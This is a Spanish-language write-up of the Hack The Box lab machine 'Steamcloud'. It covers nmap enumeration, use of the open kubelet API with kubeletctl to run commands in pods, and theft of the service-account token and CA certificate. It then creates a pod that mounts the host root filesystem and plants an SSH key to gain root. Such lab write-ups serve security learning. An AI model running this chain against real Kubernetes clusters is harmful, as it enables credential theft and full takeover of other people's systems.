---
title: Steamcloud
date: 2023-04-03 13:25:30 +/-TTTT
categories: [HTB MACHINES, Linux]
tags: []     # TAG names should always be lowercase
---

```shell
# Nmap 7.92 scan initiated Mon Apr  3 17:02:34 2023 as: nmap -sCV -p22,2379,2380,8443,10249,10250,10256 -oN targeted 10.10.11.133
Nmap scan report for 10.10.11.133
Host is up (0.13s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-04-03T22:00:15
|_Not valid after:  2024-04-02T22:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
2380/tcp  open  ssl/etcd-server?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-04-03T22:00:15
|_Not valid after:  2024-04-02T22:00:16
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 34a73c44-bf63-4216-aed3-594b5e36b53f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4dd07ba2-4104-4139-9baf-41c56ecc6356
|     X-Kubernetes-Pf-Prioritylevel-Uid: 65e0f119-8ac3-45df-936d-7ef5eba8d0e2
|     Date: Mon, 03 Apr 2023 22:03:00 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 35c6ec19-82f0-4bc7-bdf7-261448714a17
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4dd07ba2-4104-4139-9baf-41c56ecc6356
|     X-Kubernetes-Pf-Prioritylevel-Uid: 65e0f119-8ac3-45df-936d-7ef5eba8d0e2
|     Date: Mon, 03 Apr 2023 22:02:59 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2023-04-02T22:00:13
|_Not valid after:  2026-04-02T22:00:13
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1680559219
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2023-04-03T21:00:18
|_Not valid after:  2024-04-02T21:00:18
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=4/3%Time=642B4D08%P=x86_64-pc-linux-gnu
SF:%r(HTTPOptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2035c6e
SF:c19-82f0-4bc7-bdf7-261448714a17\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x204dd07ba2-4104-4139-9baf-41
SF:c56ecc6356\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2065e0f119-8ac3-45df-
SF:936d-7ef5eba8d0e2\r\nDate:\x20Mon,\x2003\x20Apr\x202023\x2022:02:59\x20
SF:GMT\r\nContent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\
SF:\\"/\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(
SF:FourOhFourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2034
SF:a73c44-bf63-4216-aed3-594b5e36b53f\r\nCache-Control:\x20no-cache,\x20pr
SF:ivate\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x
SF:20nosniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x204dd07ba2-4104-4139-9baf
SF:-41c56ecc6356\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x2065e0f119-8ac3-45
SF:df-936d-7ef5eba8d0e2\r\nDate:\x20Mon,\x2003\x20Apr\x202023\x2022:03:00\
SF:x20GMT\r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersi
SF:on\":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbid
SF:den:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\
SF:\"/nice\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"de
SF:tails\":{},\"code\":403}\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(RTSPRequest,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(S
SF:SLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  3 17:04:22 2023 -- 1 IP address (1 host up) scanned in 107.67 seconds
```
En primeras todo parece apuntar que se trata de una máquina que tiene implementado kubernetes por detrás, sabemos que una manera de enumerar este servicio es por medio de `kubectl` y `kubeletctl`, primero intentamos enumerar por kubectl.

```shell
❯ kubectl --server https://10.10.11.133:8443 get nodes
Please enter Username: admin
Please enter Password: Unable to connect to the server: x509: certificate signed by unknown authority
```
Cualquier comando que intentemos realizar nos pide autenticación, por lo que procedemos a enumerar el servicio con kubeletctl al tener el puerto 10250 abierto.

```shell
❯ ./kubeletctl_linux_amd64 -s 10.10.11.133 pods
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ kube-proxy-cfsqr                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ coredns-78fcd69978-w5f5p           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```
Al poder enuemrar correctamente los pods procedemos a listar los pods donde podemos ejectuar comandos, vemos que el pod nginx tiene la capacidad de ejecutar comandos por lo que podemos crear una bash para entrar en ella.

```shell
❯ ./kubeletctl_linux_amd64 -s 10.10.11.133 scan rce
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ kube-proxy-cfsqr                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ coredns-78fcd69978-w5f5p           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```
En [hacktricks](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration) pudimos ver la manera de enumerar el pod al estar dentro, menciona que necesitamos un ca.crt y un token para que podamos autenticarnos al nodo maestro, buscamos en los directorios que nos da hacktricks y procedemos a copiarnos esos archivos a nuestra máquina.

```shell
❯ ./kubeletctl_linux_amd64 -s 10.10.11.133 run "ls /run/secrets/kubernetes.io/serviceaccount" -c nginx -p nginx -n default
ca.crt
namespace
token

❯ ./kubeletctl_linux_amd64 -s 10.10.11.133 run "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" -c nginx -p nginx -n default > ca.crt
❯ ./kubeletctl_linux_amd64 -s 10.10.11.133 run "cat /run/secrets/kubernetes.io/serviceaccount/token" -c nginx -p nginx -n default > token
```
Procedemos a autenticarnos con kubectl, dentro de este podemos listar los privilegios que tenemos. Vemos que tenemos privilegios para crear nuevos pods dentro del nodo. Esto podría ser muy útil ya que al crear un nuevo pod podemos crearnos una montura de toda la máquina para que tengamos todos los archivos de root.

```shell
❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Ijhhem<SNIP>' auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```
Para eso creamos un archivo con ayuda de chatgpt para crearnos un nuevo pod.

```shell
apiVersion: v1
kind: Pod
metadata:
  name: guero-pod2
  namespace: default
spec:
  containers:
  - name: guero-pod2
    image: nginx:1.14.2
    volumeMounts:
    - name: mnt-volume
      mountPath: /mnt
  volumes:
  - name: mnt-volume
    hostPath:
      path: /
```
```shell
❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Ijhhem<SNIP>' apply -f guero-pod.yaml
pod/guero-pod2 created
❯ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6Ijhhem<SNIP>' get pods
NAME        READY   STATUS              RESTARTS   AGE
guero-pod2   0/1     ContainerCreating   0          10s
nginx       1/1     Running             0          4h53m
```
Ahora que podemos ejecutar comandos en nuestro pod y tenemos la ruta completa de la máquina montada, podemos poner nuestra clave pública ssh y poder conectarnos directamente por ssh a la máquina.

```shell
❯ ./kubeletctl_linux_amd64 -s 10.10.11.133 exec "bash" -c guero-pod2 -p guero-pod2 -n default
root@guero-pod2:/# stty size
stty size
0 0
root@guero-pod2:/# stty rows 31 columns 205 
stty rows 31 columns 205
root@guero-pod2:/# cd /mnt
cd /mnt
root@guero-pod2:/mnt# ls
ls
bin  boot  dev	etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run	sbin  srv  sys	tmp  usr  var  vmlinuz	vmlinuz.old
```
```shell
 ssh root@10.10.11.133
The authenticity of host '10.10.11.133 (10.10.11.133)' can't be established.
ECDSA key fingerprint is SHA256:HuAGbWkILaV55h3+S9bX+dGSS5fZ9s6Jqk84JppFgK4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.133' (ECDSA) to the list of known hosts.
Linux steamcloud 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 10 09:00:00 2022
root@steamcloud:~# whoami
root
```
